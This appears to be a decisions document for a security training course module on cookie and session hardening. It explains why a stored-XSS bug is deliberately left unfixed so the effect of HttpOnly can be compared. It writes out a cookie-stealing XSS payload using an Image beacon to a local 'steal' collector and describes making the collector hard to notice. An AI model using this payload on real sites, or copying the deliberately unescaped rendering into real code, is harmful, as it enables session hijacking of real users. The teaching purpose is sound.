# Module 13 — Decisions: Cookie & Session Hardening

## 1. The stored-XSS bug is left completely unfixed in both variants
**Decision:** Both `vulnerable-cookie` and `fixed-cookie` use Module 07's
exact unescaped comment rendering. Neither applies Module 11's encoding fix.
**Why:** This module's lesson is specifically about what `HttpOnly` does
and does not change. If the injection point were fixed, the script would
never run in either variant, and there would be nothing left to compare —
you'd never see the difference between "script runs and steals the
cookie" and "script runs and gets nothing." Leaving the bug in place in
BOTH variants isolates `HttpOnly` as the only variable, exactly like
Module 12 isolated CSP the same way.
**Trade-off:** None specific to production code — reinforcing, again,
that `HttpOnly` is a defense layered ON TOP OF fixing XSS, never a
substitute for it.

## 2. Exfiltration uses `new Image().src`, not `fetch()`
**Decision:** The proof-of-concept payload is
`new Image().src = 'http://localhost:8002/steal?c=' + encodeURIComponent(document.cookie)`,
not a `fetch()` call.
**Why:** An `<img>`/`Image()` request to a different origin is not
subject to CORS restrictions the way `fetch()` is — the browser will
happily let a page load an image from anywhere, which is exactly why
Module 04 and Module 09 also used image-tag techniques. `fetch()` to a
cross-origin endpoint can be blocked or complicated by CORS preflight
behavior depending on the target server's headers, which would add
unrelated complexity to a payload whose only job is "send this string
somewhere else."
**Trade-off:** A real attacker exfiltrating more than a single short
string (multiple cookies, page content, form data) would eventually need
something more capable than an image URL's length limits allow — at that
point `fetch()`, `navigator.sendBeacon()`, or a hidden form POST become
the more realistic techniques. For a single cookie value, an image beacon
is both realistic and simple enough to verify by eye.

## 3. The collector responds with a real 1x1 GIF, not an error or empty body
**Decision:** `attacker-collector` always returns a valid, tiny
transparent GIF image, regardless of whether `?c=` was present.
**Why:** This is exactly how real tracking pixels and real exfiltration
endpoints behave — returning a valid image means the victim's browser
never shows a broken-image icon or logs a loading error that a vigilant
victim might notice in DevTools. It's a small realism detail that matters:
a sloppy attacker who returns a 404 makes their own attack more detectable.
**Trade-off:** None — this is realistic behavior, not a simplification.

## 4. `SameSite=Lax` is added to the fixed cookie as a bonus, not the focus
**Decision:** `fixed-cookie`'s `Set-Cookie` includes both `HttpOnly` and
`SameSite=Lax`.
**Why:** Real production code virtually always sets these flags together
on a session cookie — showing `HttpOnly` in complete isolation would
understate how a real cookie header looks in practice. But this module's
verified experiment (the collector log) is specifically about
`HttpOnly`'s effect on `document.cookie`; `SameSite`'s effect on
cross-site request forgery was already the entire subject of Modules
09–10 and isn't re-tested here.
**Trade-off:** None — this is just accurately reflecting real practice
without re-deriving material already covered.

## 5. `Secure` is intentionally omitted, with the omission explained rather than hidden
**Decision:** Neither cookie in this module sets the `Secure` attribute.
**Why:** `Secure` means "never send this cookie over a plain
`http://` connection, only `https://`." This entire course runs over
plain HTTP by design (see Module 01, Decision #5) — setting `Secure` on
`http://localhost` would, in a fully spec-compliant browser, prevent the
cookie from being sent at all, breaking every demo in this module. Rather
than silently omit a flag every real production cookie should have, this
decision names it explicitly: in real deployments (which use HTTPS),
`Secure` belongs on every cookie carrying session data, alongside
`HttpOnly` and `SameSite`. Its absence here is a constraint of this
course's local HTTP setup, not a recommendation to leave it off in production.
**Trade-off:** This means the demo can't show `Secure` actually being
enforced the way it showed `HttpOnly` being enforced. A student wanting
to see `Secure` block a cookie firsthand would need a local HTTPS setup
(a self-signed certificate and an HTTPS-capable dev server), which is
outside this course's zero-config, plain-HTTP scope.
